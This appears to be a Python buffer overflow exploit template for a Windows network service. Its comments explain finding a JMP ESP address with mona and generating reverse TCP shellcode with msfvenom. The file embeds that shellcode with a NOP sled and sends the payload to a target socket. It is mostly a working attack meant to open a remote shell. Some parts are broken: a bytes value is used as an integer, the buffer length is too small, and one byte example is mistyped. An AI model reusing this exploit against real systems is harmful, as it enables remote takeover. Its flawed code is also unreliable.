#!/usr/bin/env python3
# Exploiting the buffer overflow

# With application running run the following in Immunity:
# !mona jmp -r esp -cpb "\x00" --add all enumerated bad chars
# The output should give you jumpoints, which we can use our EIP to point to
# Pick a jumpoint and change the jmp_esp to this
# jmp_esp replaces the new_eip variable in this code
# Immunity Debugger will give you a jumpoint in Little Endian, which is backwards
# Example: 0x080414c3 is \xc3\x14\x04\08
# We used struct to do the reversing of Little Endian for us
# Now that we know where we can point to, we need something to point to
# Generate shell code with the following:
# msfvenom -p windows/shell/reverse_tcp LHOST=192.0.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f py -v shell
# -p for payload | EXITFUNC=thread to exit application cleanly | 
# -f for format | -v for variable name | -b for bad characters
# Start listener and execute
# If having issues, increase/decrease nop_sled variable
# No ops, \x90 do nothing
# Having these precede the payload increase chance of success
# If the program lands anywhere in the nop_sled it will do nothing then slide into that payload

import socket, struct

#converts to little endian
def p32(data):
    return struct.pack('<I', data)

ip, port = "192.0.0.0", 9999 #change me
command = b""
length = 20
offset = b"A" * 10
jmp_esp = p32(0x080414c3)
timeout = 5

shell =  b""
shell += b"\xb8\x88\xec\x70\xa7\xdb\xdd\xd9\x74\x24\xf4\x5f"
shell += b"\x31\xc9\xb1\x5e\x31\x47\x15\x83\xc7\x04\x03\x47"
shell += b"\x11\xe2\x7d\x10\x98\x28\x7d\xe9\x59\x57\xf4\x0c"
shell += b"\x68\x45\x62\x44\xd9\x59\xe1\x08\xd2\x12\xa7\xb8"
shell += b"\xdb\xdb\xcc\xb3\x33\x2b\x65\x79\x62\x02\x49\xd2"
shell += b"\x56\x05\x35\x29\x8b\xe5\x04\xe2\xde\xe4\x41\xb4"
shell += b"\x95\x09\x1f\x10\xdd\x84\x8f\x15\xa3\x14\xae\xf9"
shell += b"\xaf\x25\xc8\x7c\x6f\xd1\x64\x7e\xa0\x4a\xff\xc8"
shell += b"\x58\xe0\xa7\xe8\x59\x25\xd2\x20\x2d\xf5\xed\x4d"
shell += b"\x87\x8e\x39\x39\x19\x47\x70\xfd\xb6\xa6\xbd\xf0"
shell += b"\xc7\xef\x79\xeb\xbd\x1b\x7a\x96\xc5\xdf\x01\x4c"
shell += b"\x43\xc0\xa1\x07\xf3\x24\x50\xcb\x62\xae\x5e\xa0"
shell += b"\xe1\xe8\x42\x37\x25\x83\x7e\xbc\xc8\x44\xf7\x86"
shell += b"\xee\x40\x5c\x5c\x8e\xd1\x38\x33\xaf\x02\xe4\xec"
shell += b"\x15\x48\x06\xfa\x2a\xb1\xd9\x03\x77\x26\x16\xce"
shell += b"\x88\xb6\x30\x59\xfa\x84\x9f\xf1\x94\xa4\x68\xdc"
shell += b"\x63\xbc\x7e\xdf\xbc\x06\xee\x21\x3d\x77\x27\xe6"
shell += b"\x69\x27\x5f\xcf\x11\xac\x9f\xf0\xc7\x59\x95\x66"
shell += b"\xe2\x90\x8f\xa0\x9a\xa8\xcf\x5d\x07\x24\x29\x0d"
shell += b"\xe7\x66\xe5\xee\x57\xc7\x55\x87\xbd\xc8\x8a\xb7"
shell += b"\xbd\x02\xa3\x52\x52\xfb\x9c\xca\xcb\xa6\x56\x6a"
shell += b"\x13\x7d\x13\xac\x9f\x74\xe4\x63\x68\xfc\xf6\x94"
shell += b"\x0f\xfe\x06\x65\xba\xfe\x6c\x61\x6c\xa8\x18\x6b"
shell += b"\x49\x9e\x87\x94\xbc\x9c\xcf\x6b\x41\x95\xa4\x5a"
shell += b"\xd7\x99\xd2\xa2\x37\x1a\x22\xf5\x5d\x1a\x4a\xa1"
shell += b"\x05\x49\x6f\xae\x93\xfd\x3c\x3b\x1c\x54\x91\xec"
shell += b"\x74\x5a\xcc\xdb\xda\xa5\x3b\x58\x1c\x59\xbe\x77"
shell += b"\x85\x32\x40\xc8\x35\xc3\x2a\xc8\x65\xab\xa1\xe7"
shell += b"\x8a\x1b\x4a\x22\xc3\x33\xc1\xa3\xa1\xa2\xd6\xe9"
shell += b"\x64\x7b\xd7\x1e\xbd\x8c\xa2\x6f\x42\x6d\x53\x66"
shell += b"\x27\x6d\x54\x86\x59\x51\x83\xbf\x2f\x94\x10\x84"
shell += b"\x30\x0b\xbc\xf1\xd8\x92\x55\xb8\x84\x24\x80\xff"
shell += b"\xb0\xa6\x20\x80\x46\xb6\x41\x85\x03\x70\xba\xf7"
shell += b"\x1c\x15\xbc\xa4\x1d\x3c"

nop_sled = b"\x90" * 10
all_chars = bytearray(range(1, 256))

bad_char = [b"\x00",]

for bad in bad_char:
    all_chars = all_chars.replace(bad, b"")

fill = length - len(jmp_esp) - offset - len(nop_sled) - len(shell)

payload = b"".join([command, b"A" * offset, jmp_esp, nop_sled, shell, b"C" * fill])


try:
    with socket.socket() as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        s.send(payload + b"\r\n")
        print("Payload sent!")
except:
    print("Could not connect.")